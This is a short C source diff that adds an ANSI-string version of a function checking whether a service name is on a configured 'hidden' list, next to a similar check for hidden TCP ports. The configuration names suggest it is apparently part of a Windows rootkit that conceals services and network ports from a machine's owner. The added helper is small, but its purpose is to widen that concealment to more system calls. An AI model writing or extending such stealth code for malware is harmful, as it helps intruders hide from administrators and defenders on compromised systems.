@@ -71,6 +71,17 @@ BOOL IsServiceNameHidden(LPCWSTR name)
 {
 	return Configuration && StringListContains(Configuration->HiddenServiceNames, name);
 }
+BOOL IsServiceNameHiddenA(LPCSTR name)
+{
+	if (!name) return FALSE;
+	
+	WCHAR wideName[MAX_PATH];
+	if (MultiByteToWideChar(CP_ACP, 0, name, -1, wideName, MAX_PATH) > 0)
+	{
+		return IsServiceNameHidden(wideName);
+	}
+	return FALSE;
+}
 BOOL IsTcpLocalPortHidden(USHORT port)
 {
 	return Configuration && IntegerListContains(Configuration->HiddenTcpLocalPorts, port);
